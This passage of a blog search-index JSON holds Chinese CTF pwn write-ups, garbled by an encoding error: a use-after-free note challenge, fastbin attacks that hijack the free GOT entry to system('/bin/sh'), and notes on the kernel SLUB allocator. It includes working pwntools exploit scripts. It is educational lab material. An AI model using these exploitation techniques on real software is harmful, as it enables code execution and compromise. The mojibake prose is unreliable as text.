free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n\nvoid print_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    notelist[idx] -> print_note(notelist[idx]);\n  }\n}\n\nvoid magic() \n{ \n  system(\"cat ./flag\"); \n}\n\nvoid menu() {\n  puts(\"----------------------\");\n  puts(\"       UAF NOTE       \");\n  puts(\"----------------------\");\n  puts(\" 1. Add note          \");\n  puts(\" 2. Delete note       \");\n  puts(\" 3. Print note        \");\n  puts(\" 4. Exit              \");\n  puts(\"----------------------\");\n  printf(\"Your choice :\");\n};\n\nint main() {\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  char buf[4];\n  while (1) {\n    menu();\n    read(0, buf, 4);\n    switch(atoi(buf)) \n    {\n      case 1:\n        add_note();\n        break;\n      case 2:\n        del_note();\n        break;\n      case 3:\n        print_note();\n        break;\n      case 4:\n        exit(0);\n        break;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n  return 0;\n}\n```\n\nç¼–è¯‘ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngcc note.c -no-pie -o note\n```\n\n2.æ‰“å¼€IDAï¼ŒæŸ¥æ¼æ´ï¼Œdel-noteå‡½æ•°ä¸­å­˜åœ¨UAFæ¼æ´ï¼Œå¹¶ä¸”è¿˜æœ‰åé—¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif ( notelist[idx] )\n{\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n}\n//è¿™é‡Œç»è¿‡IDAäººå·¥æ•°æ®ä¿®æ”¹è¿‡ï¼Œåˆšæ‰“å¼€ä¸ä¼šæ˜¯è¿™æ ·çš„ã€‚\n----------------------------------------------------\nint magic()\n{\n    return system(\"cat ./flag\");\n}\n```\n\nå¯ä»¥çœ‹åˆ°åœ¨Freeä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºï¼Œå¯¼è‡´Freeä¹‹åï¼Œå¦‚æœé€šè¿‡ç¨‹åºä¸­çš„printé€‰é¡¹æ¥æ‰“å°ä¾ç„¶å¯ä»¥è°ƒç”¨è¢«è¯¥æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨UAFã€‚\n\n3.è¿™ä¸€é¢˜ä¸­æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191534858.jpeg)\n\nå…¶ä¸­mallocé¡ºåºæ˜¯ï¼š\n\n(1)mallocæ§åˆ¶æ•°æ®éƒ¨åˆ†chunk_controlï¼Œå›ºå®šå¤§å°ä¸º0x10ã€‚\n\n(2)å°†contentï¼Œä¹Ÿå°±æ˜¯çœŸæ­£æ•°æ®éƒ¨åˆ†mallocå‡ºæ¥ï¼Œchunk_dataï¼Œè¿™é‡Œå¯ä»¥è®¾ç½®sizeã€‚\n\nfreeé¡ºåºæ˜¯ï¼š\n\n(1)å…ˆfreeæ‰dataéƒ¨åˆ†ï¼Œchunk_dataã€‚\n\n(2)å†freeæ§åˆ¶æ•°æ®éƒ¨åˆ†çš„structï¼Œchunk_controlã€‚\n\n4.æ€è€ƒæ”»å‡»æ€è·¯ï¼Œæ—¢ç„¶æœ‰UAFæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•Freeå‡ ä¸ªchunkï¼Œç„¶ååˆ©ç”¨fastbinså…ˆè¿›åå‡ºçš„åŸåˆ™ï¼Œå°†æŸä¸ªæ§åˆ¶æ•°æ®éƒ¨åˆ†çš„chunk_controlç”³è¯·å›æ¥å˜æˆæˆ‘ä»¬å¯ä»¥æ“ä½œçš„chunk_dataï¼Œè¿›è¡Œfastbins attackã€‚ä¹‹åä¿®æ”¹å…¶ä¸­çš„æ‰“å°å‡½æ•°åœ°å€ï¼Œæ”¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆä½¿ç”¨ç¨‹åºä¸­çš„printå°±å¯ä»¥è·³è½¬åé—¨å‡½æ•°è·å–flagã€‚\n\n5.å…ˆç”³è¯·ä¸¤ä¸ªç»“æ„ï¼Œdataéƒ¨åˆ†è‡³å°‘ä¸º0x19ï¼Œä½¿å¾—chunk_dataä¸è½å…¥åˆ°0x20çš„fastbinsä¸­ã€‚ä¹‹åé‡Šæ”¾æ‰è¿™ä¸¤ä¸ªç»“æ„ï¼Œç„¶åfastbinsä¸­çš„ç»“æ„å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfastbinsY[0]:0x10:chunk_control1->chunk_control0\nfastbinsY[x]:0xxx:chunk_data1->chunk_data0\n```\n\n6.ç„¶åç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„ç»“æ„ï¼Œç¼–å·Aï¼Œè¯¥ç»“æ„ä¸­çš„å¯¹åº”å°±å˜æˆè¿™æ ·ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk_controlA=chunk_control1\nchunk_dataA=chunk_control0\n```\n\n7.ç°åœ¨å¯ä»¥ä¿®æ”¹chunk_dataAï¼Œå°†å…¶å†…å®¹æ”¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œç„¶åä½¿ç”¨ç¨‹åºä¸­çš„printï¼Œè¾“å…¥ç´¢å¼•ä¸º0ï¼Œç„¶åå°±ä¼šè¿è¡Œchunk_control0ä¸­çš„æ‰“å°å‡½æ•°ï¼Œä¹Ÿå°±ç›¸å½“äºè¿è¡Œchunk_dataAä¸­çš„åé—¨å‡½æ•°ã€‚\n\nç®€å•expå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x20,'aaaaaaaa') #chunk_control0+chunk_data0\nadd(0x20,'AAAAAAAA') #chunk_control1+chunk_data1\n#è¿™é‡Œçš„0x20å¯ä»¥éšä¾¿æ”¹ï¼Œåªè¦å¤§äºç­‰äº0x19å³å¯ï¼Œä¸¤ä¸ª0x20ä¹Ÿå¯ä»¥ä¸ä¸€æ ·ã€‚\n\nfree(0)\nfree(1)\n#freeé¡ºåº:chunk_data0,chunk_control0,chunk_data1,chunk_control1\n\nbackdoor = p64(elf.sym['magic'])\nadd(0x10,backdoor)\n#mallocé¡ºåº:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0\n\nshow(0)\nprint(p.recv())\n#è·å–flag\n```\n","tags":["UAF"],"categories":["PWN","pwnå †-UAF"]},{"title":"pesp-heap_overflow-struct","url":"/2021/08/14/pesp-heap_overflow-struct/","content":"\n1.ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œé€šè¿‡å †æº¢å‡ºç›´æ¥æ”¹structï¼Œç„¶åæ›´æ”¹ç»“æ„ä½“chunklist[0].chunkä¸­ä¿å­˜çš„chunkåœ°å€ï¼Œä½¿å…¶æŒ‡å‘free_got_addrï¼Œå†é€šè¿‡ç¨‹åºä¸­çš„showå‡½æ•°å°±å¯ä»¥æ³„éœ²å‡ºfree_got_addrä¸­ä¿å­˜çš„freeçœŸå®åœ°å€ï¼Œä»è€Œè·å¾—libcçš„åŸºåœ°å€ã€‚å½“ç„¶ï¼Œè¿™å¾—è¦æ±‚å…ˆæœ‰ä¸€ä¸ªfreeæ¥è®©freeçš„å»¶è¿Ÿç»‘å®šå‘ç”Ÿã€‚\n\n2.ç”±äºè¿™é‡Œçš„chunkåœ°å€å·²ç»å˜æˆfree_got_addrï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä¿®æ”¹è¯¥chunkçš„å†…å®¹æ—¶ï¼Œå°±ç›¸å½“äºä¿®æ”¹gotè¡¨ä¸­å€¼ï¼Œä¹Ÿå°±ä¿®æ”¹äº†çœŸå®å‡½æ•°åœ°å€çš„å€¼ã€‚è¿™é‡Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥chunkå†…å®¹æ¥åŠ«æŒfreeçš„gotè¡¨ä¸ºsystemå‡½æ•°çœŸå®åœ°å€ï¼Œä»è€Œfreeä¸€ä¸ªå†…å®¹ä¸ºbinshçš„chunkæ¥getshellã€‚\n\n3.ç¼–å†™expï¼Œå¢åˆ æ”¹æŸ¥å‡½æ•°å°±ä¸å¤šè¯´äº†ã€‚\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼Œå…ˆå°†chunk1é‡Šæ”¾ï¼Œä¹‹åchunk0ç”¨æ¥å †æº¢å‡ºï¼Œä¿®æ”¹chunk1çš„fdï¼Œè¿›è¡Œfastbinsæ”»å‡»ï¼Œå°†fakechunkæ”¾åœ¨structå‰é¢æŸä¸ªä½ç½®ã€‚è¿™é‡Œç”¨åˆ°å­—èŠ‚é”™ä½ï¼ŒåŸç†ä¸€æ ·ï¼Œåˆ©ç”¨0x7fæ¥æ”»å‡»fastbinsã€‚å†è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œchunk1å’Œchunk3å°±å›æ¥ï¼Œè¿™é‡Œçš„chunk3å°±æ˜¯fakechunkäº†ã€‚ç°åœ¨å°±å¯ä»¥ä¿®æ”¹fakechunkä»è€Œä¿®æ”¹æ‰chunklist[0].chunkçš„å€¼ï¼Œä½¿å…¶æŒ‡å‘free_got_addrã€‚ä»è€Œè°ƒç”¨showå‡½æ•°æ³„éœ²freeçš„çœŸå®åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x60,\"\\x00\"*0x60) #chunk0\nadd(0x60,\"\\x11\"*0x60) #chunk1\nadd(0x60,'/bin/sh\\x00') #chunk2 binsh\n\nremove(1)\nchange(0,0x100,flat(\"\\x00\"*0x60,p64(0),p64(0x71),p64(bss)))#chunk0_overflow\nadd(0x60,\"\\x11\"*0x60)#get chunk1\nadd(0x60,flat(\"\\x00\"*0x3,p64(0x100),p64(free_got_addr)))#get fakechunk\nshow()\nio.recvuntil(\"0 : \")\nlibc_base = u64(io.recv(6).ljust(8,'\\x00')) - libc.sym['free']\n```\n\n(2)å†ä¿®æ”¹chunk0çš„å†…å®¹ä¸ºsystemçœŸå®åœ°å€ï¼Œè¿™æ ·å°±ç›¸å½“äºåŠ«æŒfreeçš„gotè¡¨ï¼Œä¹‹åé‡Šæ”¾æ‰chunk2å³å¯getshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nsystem_libc = libc_base + libc.sym['system']\nputs = libc_base + libc.sym['puts']\nchange(0,0x100,flat(p64(system_libc,),p64(puts)))\nremove(2)\nio.interactive()\n```\n\nâ–²éœ€è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ï¼Œç”±äºreadå‡½æ•°è¯»å–ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€æ•°æ®æ—¶ä¸€å®šä¼šæœ‰ä¸€ä¸ª\\x0aåŠ å…¥è¿›å»ï¼Œè¿™é‡Œå¦‚æœä¸è€ƒè™‘è¿›å…¥ï¼Œfreeå‡½æ•°åé¢å°±æ˜¯putå‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆputå‡½æ•°çš„Gotè¡¨è¢«æ›´æ”¹ï¼Œä»è€Œæ— æ³•æˆåŠŸè°ƒç”¨putå‡½æ•°ã€‚è€Œç¨‹åºåœ¨å¾ªç¯ä½“ä¸­çš„èœå•éƒ¨åˆ†åˆä¸€å®šä¼šè°ƒç”¨putå‡½æ•°ï¼Œé‚£ä¹ˆè¿™æ ·å°±ä¼šé€ æˆç¨‹åºå´©æºƒã€‚æ‰€ä»¥éœ€è¦å°†putå‡½æ•°ä¹ŸåŠ å…¥è¿›å»ï¼Œä½†æ˜¯è¿™æ ·åˆä¼šé€ æˆputå‡½æ•°ä¸‹ä¸€ä¸ªå‡½æ•°è¢«è¦†ç›–\\x0aã€‚ä¸è¿‡ä¸è¦ç´§ï¼Œgdbè°ƒè¯•å¯ä»¥çœ‹åˆ°putå‡½æ•°ä¸‹ä¸€ä¸ªå‡½æ•°æ˜¯stack_chk_failå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥canaryå‡ºé”™æ—¶æ‰ä¼šè°ƒç”¨ã€‚æˆ‘ä»¬æœ‰æ²¡æœ‰æ ˆæº¢å‡ºä¿®æ”¹canaryï¼Œè¿™ä¸ªå‡½æ•°å½“ç„¶ä¸ä¼šè¢«è°ƒç”¨ï¼Œç¨‹åºå°±ä¸ä¼šå´©æºƒã€‚\n\n \n\n \n\n \n","tags":["Heap-Skill"],"categories":["PWN","pwnå †-åˆ·é¢˜æŠ€å·§"]},{"title":"pwn-kernel_Heapæ€»ç»“","url":"/2021/08/14/pwn-kernel_Heapæ€»ç»“/","content":"\nä¸€ã€SLUBå’ŒSLABï¼šå†…æ ¸çš„å †æ¯”ç”¨æˆ·çš„å †ä¼šç®€å•å¾ˆå¤šï¼Œéœ€è¦äº†è§£ä¸€äº›æœºåˆ¶ã€‚\n\n1.åˆ†é…çš„å¤§å°ï¼šä¹Ÿæ˜¯ç±»ä¼¼å¯¹é½çš„ï¼Œä½†ä¹Ÿæœ‰ç‚¹ä¸åŒ\n\nlinuxä¸‹æŸ¥çœ‹å‘½ä»¤ï¼šcat /proc/slabinfo\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_12-46-27.png)\n\nå¯ä»¥çœ‹åˆ°kmallocåˆ†ä¸ºå¾ˆå¤šçš„å¤§å°ï¼Œä»å¤§åˆ°å°åˆ†åˆ«ä¸º8k->8å­—èŠ‚ï¼Œæ¯ä¸ªéƒ½ç›¸å½“äºæ˜¯ä¸€ä¸ªæ¡¶ï¼Œé‡Œé¢å­˜å‚¨æ‰€æœ‰çš„ç©ºé—²å—æˆ–è€…éç©ºé—²å—ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åˆ†é…17å­—èŠ‚æ—¶ï¼Œå¾—åˆ°çš„ç©ºé—´å…¶å®æ˜¯32å­—èŠ‚ï¼Œ5Kå­—èŠ‚å¾—åˆ°çš„æ˜¯8Kå­—èŠ‚çš„ç©ºé—´ã€‚è¿™ä¸ªåœ¨ç”¨å †æº¢å‡ºçš„æ—¶å€™éœ€è¦ç”¨åˆ°ã€‚\n\n \n\n2.ç®¡ç†æœºåˆ¶ï¼šå•é“¾è¡¨ç»“æ„\n\n(1)ç”³è¯·åŸåˆ™ï¼š\n\nä»¥ä¸€å®šå¤§å°çš„ç©ºé—²chunkä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ï¼Œä»¥fdä¸²è”ï¼Œå¹¶ä¸”chunkçš„ç»“æ„åªæœ‰ä¸€ä¸ªfdï¼Œä¸åƒç”¨æˆ·æ€ä¸­æœ‰æœ‰å¤´ç»“æ„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-14-21.png)\n\nå¦‚æœç”³è¯·æœŸé—´æ”¹å˜äº†ç©ºé—²é“¾è¡¨ç¬¬ä¸€ä¸ªchunkçš„fdï¼Œé‚£ä¹ˆå†ç”³è¯·ä¸€æ¬¡å¾—åˆ°è¯¥chunkï¼Œç„¶åå†ç”³è¯·å°±å¾—åˆ°ä¿®æ”¹åçš„fdã€‚å¦‚ä¸Šå›¾ï¼Œå¦‚æœ0xffff8880029f8000æ˜¯å¯¹åº”slubæ¡¶å¤§å°çš„chunkç©ºé—²é“¾è¡¨ç¬¬ä¸€ä¸ªï¼Œé‚£ä¹ˆç”³è¯·è¯¥å¤§å°chunkåå¾—åˆ°çš„æ˜¯0xffff8880029f8000ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±ä¼šå¾—åˆ°0x6bc360ã€‚\n\nâ–²è¿™ä¸ªå…·ä½“çš„ç®¡ç†ç»“æ„ä¸çŸ¥é“åœ¨å“ªï¼Œä½†æ˜¯å¦‚æœå†ç”³è¯·è¯¥å¤§å°çš„chunkï¼š\n\nâ‘ 0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸ºä¸€ä¸ªæœ‰æ•ˆçš„å¯ç”¨åœ°å€ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x6bc460ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°è¿ç»­å¾—åˆ°0x6bc360å’Œ0x6bc460ã€‚\n\nâ‘¡0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸º0ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x0ï¼Œé‚£ä¹ˆå…ˆå¾—åˆ°0x6bc360ï¼Œç„¶åä¼šä»å¦ä¸€ä¸ªæ¡¶ä¸­ç”³è¯·chunkï¼Œè¯¥å¤§å°çš„ç©ºé—²é“¾è¡¨æ¡¶å°±ä¼šåºŸå¼ƒä¸å†ä½¿ç”¨ï¼Œç›¸å½“äºç³»ç»Ÿé»˜è®¤è¯¥æ¡¶ç”¨å®Œã€‚ä¹‹åå†ç”³è¯·è¯¥å¤§å°çš„chunkä¼šä»æ–°æ¡¶ä¸­ç»§ç»­ç”³è¯·ã€‚\n\nâ‘¢0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸ºæ— æ•ˆåœ°å€ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x40ï¼Œé‚£ä¹ˆå…ˆå¾—åˆ°0x6bc360ï¼Œç„¶åå†ç”³è¯·ï¼Œç³»ç»Ÿå°±ä¼šå´©æºƒã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-25-50.png)\n\n \n\n(2)é‡Šæ”¾åŸåˆ™ï¼š\n\nåŒæ ·æ˜¯ä»¥ä¸€å®šå¤§å°çš„ç©ºé—²chunkä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ï¼Œä»¥fdä¸²è”ï¼Œä¹Ÿç±»ä¼¼fastbinç»“æ„ï¼Œå…ˆè¿›åå‡ºï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œé‡Šæ”¾å®Œä¸‰ä¸ªchunkä¹‹åï¼Œå†ç”³è¯·ï¼Œä¼šå…ˆå¾—åˆ°chunk0ï¼Œå†å¾—åˆ°chunk2ï¼Œchunk1ã€‚æ‰€ä»¥è¿™é‡Œä¹ŸåŒæ ·å¯ä»¥çœ‹å‡ºï¼Œåœ¨é‡Šæ”¾ä¹‹åï¼Œè¯¥chunkçš„fdä¼šè¢«æ”¹å†™ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²chunkã€‚åªä¸è¿‡ä¸ç”¨çœ‹sizeå’Œå…¶ä»–ä¸ƒä¸ƒå…«å…«çš„æ£€æŸ¥ï¼Œåªç”¨fdå³å¯æ‰“ç±»ä¼¼fastbinçš„æ”»å‡»äº†ï¼Œæ–¹ä¾¿äº†å¾ˆå¤šã€‚\n","tags":["kernelHeap-Knowledge"],"categories":["pwn-kernel"]},{"title":"pesp_heap-overflow","url":"/2021/08/14/pesp_heap-overflow/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†canaryå’ŒNXï¼ŒPartial RELROã€‚å¼€IDAæ‰¾æ¼æ´ï¼Œchangeå‡½æ•°ä¸­å­˜åœ¨å †æº¢å‡º:\n\n```\n#æ³¨é‡Šå¤´\n\nint v0; // ST08_4\nchar nptr; // [rsp+20h] [rbp-10h]\nchar buf; // [rsp+10h] [rbp-20h]\n----------------------------------------------------------\nprintf(\"Please enter the index of servant:\");\nread(0, &buf, 8uLL);\nv2 = atoi(&buf);\n--------------------------------------------------------------\nprintf(\"Please enter the length of servant name:\", &buf);\nread(0, &nptr, 8uLL);\nv0 = atoi(&nptr);\n```\n\nå¯ä»¥å‘ç°changeå‡½æ•°ä¸­ï¼Œå¹¶æ²¡æœ‰æ£€æŸ¥å †å—çš„å¤§å°ï¼Œæˆ‘ä»¬è¾“å…¥å¤šå°‘ï¼Œå®ƒå°±è®¤ä¸ºæ˜¯å¤šå°‘ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ¶é€ å †æº¢å‡ºã€‚\n\n2.è¿™é¢˜æœ‰å¾ˆå¤šå…¶å®ƒæ¼æ´ï¼Œè¿™é‡Œå…ˆåªåˆ©ç”¨å †æº¢å‡ºæ¥æ€è€ƒä¸‹ã€‚\n\n(1)å…ˆç”³è¯·ä¸¤ä¸ªchunkï¼Œchunk1å’Œchunk2ï¼Œç„¶åä¿®æ”¹chunk1çš„å¤§å°å’Œå†…å®¹ï¼Œä½¿å¾—æº¢å‡ºæ•°æ®ï¼Œå°†chunk2çš„fdæ”¹æˆgotè¡¨ä¸­åœ°å€ï¼Œä¹‹åé‡Šæ”¾æ‰chunk2ï¼Œä½¿å…¶åœ¨fastbinsä¸­çš„ç»“æ„ä¸º:\n\n```\n#æ³¨é‡Šå¤´\n\nfastbins->chunk2\nchunk2.fd=got_addrã€‚\n```\n\nè¿™æ ·å°±å¯ä»¥å†ç”³è¯·chunk_aï¼Œchunk_bï¼Œè¿™é‡Œçš„chunk_aå°±æ˜¯ä»fastbinsä¸­ç”³è¯·å›æ¥çš„chun2ï¼Œè€Œchunk_bçš„é¦–åœ°å€å°±æ˜¯got_addrã€‚ä¹‹åé€šè¿‡ä¿®æ”¹chunk_bçš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹gotè¡¨ä¸­çš„å†…å®¹ï¼Œä»è€ŒåŠ«æŒgotè¡¨ã€‚\n\n(2)ç”±äºè¿™é‡Œå¼•å…¥äº†printfå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å°†freeå‡½æ•°çš„gotè¡¨åŠ«æŒä¸ºprintf(plt)å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨freeä¸€ä¸ªchunkæ—¶åˆ¶é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹chunkå†…å®¹ä¸ºéœ€è¦çš„æ ¼å¼åŒ–å­—ç¬¦ä¹‹åï¼Œå†é€šè¿‡è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸ŠæŸå‡½æ•°çš„Libcåœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°systemå‡½æ•°çœŸå®åœ°å€ã€‚\n\n(3)ä¹‹åå†é€šè¿‡ä¸Šè¿°æ–¹æ³•ï¼Œå°†free_gotåŠ«æŒä¸ºsystem_real_addrï¼Œä¹‹åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸ºbinshå­—ç¬¦ä¸²çš„chunkï¼Œå°±ç›¸å½“äºè°ƒç”¨system(\"/bin/sh\")ï¼Œä»è€Œgetshellã€‚\n\n3.å¼€å§‹ç¼–å†™payload\n\n(1)é¦–å…ˆç¡®å®šå¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef show():\n    io.sendlineafter(\"choice:\",\"1\")\n\ndef add(length,cont):\n    io.sendlineafter(\"choice:\",\"2\")\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef edit(idx,length,cont):\n    io.sendlineafter(\"choice:\",\"3\")\n    io.sendlineafter(\":\",str(idx))\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef delete(idx):\n    io.sendlineafter(\"choice:\",\"4\")\n    io.sendlineafter(\":\",str(idx))\n```\n\n(2)å°è¯•ä¿®æ”¹gotè¡¨ï¼Œåˆ¶é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´\n\n```\n#ç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk0,chunk1,chunk2åŒ…æ‹¬ä¹‹åéœ€è¦çš„æ ¼å¼åŒ–å­—ç¬¦ã€‚\nadd(0x50,'000000')\nadd(0x50,'111111')\nadd(0x10,\".%17$p.\")\n#64ä½ç¨‹åºï¼Œå°†æ–­ç‚¹ä¸‹åœ¨changeå‡½æ•°ä¸­çš„call freeï¼Œè§‚å¯Ÿæ­¤æ—¶æ ˆä¸­æ•°æ®ï¼Œå¯ä»¥å‘ç°ä»rspå¾€ä¸‹æ•°12æ˜¯libc_main_addrï¼Œè®¡ç®—åç§»ä¸º12+6-1=17.\n\n#é‡Šæ”¾chunk1,ä¹‹åä¿®æ”¹chunk1çš„fdä½ä½¿å…¶æŒ‡å‘fakechunk\ndelete(1)\nedit(0,0x100,flat('0'*0x50,'00000000',0x61,0x601ffa))\n#è¿™é‡Œä¸¤æ¡ä»£ç é¡ºåºä¸èƒ½æ”¹å˜ï¼Œå› ä¸ºå½“chunk1è¢«é‡Šæ”¾æ—¶ï¼Œå…¶fdä½ä¼šå‘ç”Ÿæ”¹å˜ï¼ŒæŒ‡å‘0x0ï¼Œç¬¬ä¸€ä¸ªè¿›å…¥fastbinsçš„chunkå…¶fdåªè¦ä¸è¢«ä¿®æ”¹ï¼Œä¸€ç›´éƒ½æ˜¯æŒ‡å‘0x0ã€‚æ‰€ä»¥éœ€è¦å…ˆé‡Šæ”¾ï¼Œå†ä¿®æ”¹ï¼Œé˜²æ­¢ä¹‹åfdè¢«ä¿®æ”¹æŒ‡å‘0x0ã€‚\n#ç°åœ¨fastbinsä¸º:fastbinsY[0]->chunk1->fakechunk\n\n#è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œå°†chunk1å’Œfakechunkç”³è¯·å›æ¥ï¼ŒåŒæ—¶åŠ«æŒgotè¡¨ï¼Œå°†freeå‡½æ•°çš„gotè¡¨å€¼æ”¹æˆprintfçš„pltè¡¨å€¼ï¼Œè°ƒç”¨pltè¡¨ä¸­ä»£ç ï¼Œä»è€Œè°ƒç”¨printfå‡½æ•°ã€‚\nadd(0x50,'xxxxxxxx')\nadd(0x50,flat(\"\\0\"*0xe,flat(elf.sym[\"printf\"])[:6]))#get fakechunk,change got\n\n#é‡Šæ”¾chunk2ï¼Œè§¦å‘freeå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åŠ«æŒåçš„printfå‡½æ•°ï¼Œå¾—åˆ°æ ˆä¸Šåœ°å€libc_main_addrï¼Œè®¡ç®—å¾—åˆ°libc_address\ndelete(2)\nio.recvuntil(\".\")\ntemp = io.recvuntil(\".\",drop=True)\nlibc_address = int(temp,16) - 0x20840\n```\n\n(3)å†æ¬¡åŠ«æŒgotè¡¨ä¸ºsystemå‡½æ•°ï¼Œé‡Šæ”¾Binshå­—ç¬¦chunkï¼Œgetshell\n\n```\n#æ³¨é‡Šå¤´\n\n#è¿™é‡Œçš„chunk3å°±æ˜¯fakechunkï¼Œä¹Ÿå°±æ˜¯gotè¡¨\nedit(3,0x50,flat('\\0'*14,flat(libc_address+libc.sym['system'])[:6]))\nadd(0x10,\"/bin/sh\\0\")\n#ç”±äºå‰ä¸€ä¸ªé‡Šæ”¾çš„æ˜¯chunk2ï¼Œæ‰€ä»¥è¿™é‡Œå†æ¬¡ç”³è¯·å›æ¥çš„ç´¢å¼•è¿˜æ˜¯2ï¼Œå¯ä»¥å¤šæ¬¡è¿è¡Œç¨‹åºå°è¯•å°±å¯ä»¥çŸ¥é“ï¼Œå½“å‰é¢æŸä¸ªçš„chunkä¸ºç©ºæ—¶ï¼Œç”³è¯·çš„chunkä¼šå…ˆå¡«æ»¡å‰é¢çš„ç©ºçš„chunkç´¢å¼•ã€‚\ndelete(2)\nio.interactive()\n```\n\nâ–²åˆ¶é€ fakechunkæ—¶ï¼Œéœ€è¦è®¾ç½®åˆæ³•çš„sizeï¼Œä¸ç„¶å¦‚æœfastbinsä¸­çš„chunk.fdæŒ‡å‘fakechunkï¼Œè€Œfakechunkçš„å¤§å°åˆä¸æ˜¯è¯¥fastbinsç»„ä¸­ï¼Œé‚£ä¹ˆç¨‹åºä¼šå´©æºƒã€‚æ‰€ä»¥åœ¨æœ€å¼€å§‹è®¾ç½®å¤§å°æ—¶ï¼Œå°±éœ€è¦å¥½å¥½è®¡ç®—ä»¥ä¸‹ï¼Œé€šè¿‡è°ƒè¯•çœ‹çœ‹gotè¡¨ä¸­åœ¨freeå‡½æ•°å‰èƒ½ä¸èƒ½æ‰¾åˆ°è¿˜æ²¡è¢«å»¶è¿Ÿç»‘å®šçš„å‡½æ•°å¯ä»¥ç¡®å®šè®¡ç®—å¤§å°ï¼Œæˆ–è€…çœ‹å…¶å®ƒå‡½æ•°çš„gotè¡¨æœ€åä¸‰ä½ä¹Ÿå¯ä»¥ï¼Œè¿™æ ·æ‰èƒ½åˆ¶é€ 